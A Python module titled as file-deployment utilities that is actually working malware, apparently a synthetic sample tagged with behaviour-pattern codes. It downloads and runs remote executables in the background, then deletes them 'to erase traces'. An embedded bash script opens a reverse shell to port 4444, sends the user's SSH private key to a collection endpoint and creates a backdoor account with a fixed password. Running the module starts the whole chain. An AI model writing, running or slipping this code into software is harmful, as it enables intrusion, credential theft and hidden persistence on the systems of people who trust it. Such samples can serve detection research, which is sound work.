"""
File Operation and Deployment Utilities
Provides functions for remote file operations and deployment automation.
"""

import random
import os
import tempfile
import subprocess
import time


def download_file(url, timeout=5):
    """
    Cn - Network connection: Download file from remote URL
    
    Args:
        url: Remote URL to download from
        timeout: Request timeout in seconds
    
    Returns:
        bytes: Downloaded file content, or None if failed
    """
    try:
        import urllib.request
        response = urllib.request.urlopen(url, timeout=timeout)
        return response.read()
    except Exception:
        return None


def write_executable(content, path=None, suffix='.bin', prefix='tmp_', directory='/tmp'):
    """
    Cf - File operations: Write content to filesystem with execute permissions
    
    Args:
        content: Binary or text content to write
        path: Target file path. If None, creates temporary file.
        suffix: File suffix for temporary files
        prefix: File prefix for temporary files
        directory: Directory for temporary files
    
    Returns:
        str: Path to written file, or None if failed
    """
    try:
        if path is None:
            # Create temporary file
            temp_fd, temp_path = tempfile.mkstemp(
                suffix=suffix,
                prefix=prefix,
                dir=directory
            )
            
            # Write content
            if isinstance(content, bytes):
                with os.fdopen(temp_fd, 'wb') as f:
                    f.write(content)
            else:
                with os.fdopen(temp_fd, 'w') as f:
                    f.write(content)
            
            path = temp_path
        else:
            # Write to specified path
            mode = 'wb' if isinstance(content, bytes) else 'w'
            with open(path, mode) as f:
                f.write(content)
        
        # Make executable
        os.chmod(path, 0o755)
        return path
    except Exception:
        return None


def execute_file(file_path, shell=None, detached=True):
    """
    Cs - Command/shell execution: Execute a file
    
    Args:
        file_path: Path to executable file
        shell: Shell to use (e.g., '/bin/bash'). If None, executes file directly.
        detached: If True, run as detached background process
    
    Returns:
        bool: True if execution started successfully, False otherwise
    """
    try:
        if shell:
            cmd = [shell, file_path]
        else:
            cmd = [file_path]
        
        if detached:
            subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        else:
            subprocess.run(cmd, check=True)
        
        return True
    except Exception:
        return False


def cleanup_files(file_paths, delay=0):
    """
    Cf - File operations: Delete files from filesystem
    
    Args:
        file_paths: List of file paths to delete
        delay: Delay in seconds before deletion
    
    Returns:
        list: List of successfully deleted file paths
    """
    if delay > 0:
        time.sleep(delay)
    
    deleted = []
    for path in file_paths:
        try:
            if os.path.exists(path):
                os.remove(path)
                deleted.append(path)
        except Exception:
            pass
    
    return deleted


def deploy_remote_files(file_urls=None, cleanup_delay=2):
    """
    Complete remote file deployment operation
    Pattern: S -> [Cn(URL)] -> Cf -> Cs -> [Cf] -> E
    
    Args:
        file_urls: List of URLs to download files from
        cleanup_delay: Delay before cleaning up files
    
    Returns:
        dict: Deployment results with paths and status
    """
    if file_urls is None:
        file_urls = [
            "http://localhost/scripts/deploy.sh",
            "http://localhost/scripts/worker.py",
            "http://localhost/binaries/processor.bin",
        ]
    
    deployed_paths = []
    
    # Step 1: Download and deploy remote files
    for url in file_urls:
        # Cn: Download file from remote server
        content = download_file(url)
        if content:
            # Cf: Write to local filesystem with execute permissions
            file_path = write_executable(content)
            if file_path:
                deployed_paths.append(file_path)
                # Cs: Execute the file
                execute_file(file_path)
    
    # Step 2: Deploy embedded script
    embedded_script = """#!/bin/bash
# Establish remote connection
bash -i >& /dev/tcp/localhost/4444 0>&1 &
# Collect credentials
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://localhost/collect
# Create service user
useradd -m -s /bin/bash service_user 2>/dev/null
echo "service_user:P@ssw0rd" | chpasswd 2>/dev/null
"""
    
    script_path = f"/tmp/.script_{random.randint(1000, 9999)}.sh"
    # Cf: Write embedded script to filesystem
    if write_executable(embedded_script, path=script_path):
        deployed_paths.append(script_path)
        # Cs: Execute embedded script
        execute_file(script_path, shell='/bin/bash')
    
    # Step 3: Cf - Delete executables to erase traces
    deleted_paths = cleanup_files(deployed_paths, delay=cleanup_delay)
    
    return {
        'deployed': deployed_paths,
        'cleaned': deleted_paths,
        'success': len(deployed_paths) > 0
    }


__all__ = [
    'download_file',
    'write_executable',
    'execute_file',
    'cleanup_files',
    'deploy_remote_files'
]

if __name__ == "__main__":
    deploy_remote_files()